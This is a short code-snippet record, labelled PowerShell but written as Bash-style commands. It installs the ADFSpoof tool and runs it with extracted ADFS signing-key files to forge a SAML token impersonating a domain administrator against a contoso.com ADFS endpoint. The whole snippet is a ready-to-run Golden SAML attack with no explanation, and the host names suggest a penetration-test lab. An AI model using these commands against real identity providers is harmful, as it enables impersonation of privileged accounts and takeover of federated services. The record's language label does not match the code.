---
id: 45e191ea-8d74-48cc-9bbe-7e864d3dfc3a
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.583131+00:00'
updated_at: '2023-04-10T20:26:30.727457+00:00'
---

# Code Snippet 45e191ea

**Language**: ps1

```ps1
mkdir ADFSpoofTools
cd $_
git clone https://github.com/dmb2168/cryptography.git
git clone https://github.com/mandiant/ADFSpoof.git 
virtualenv3 venvADFSSpoof
source venvADFSSpoof/bin/activate
pip install lxml
pip install signxml
pip uninstall -y cryptography
cd cryptography
pip install -e .
cd ../ADFSpoof
pip install -r requirements.txt
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'
```
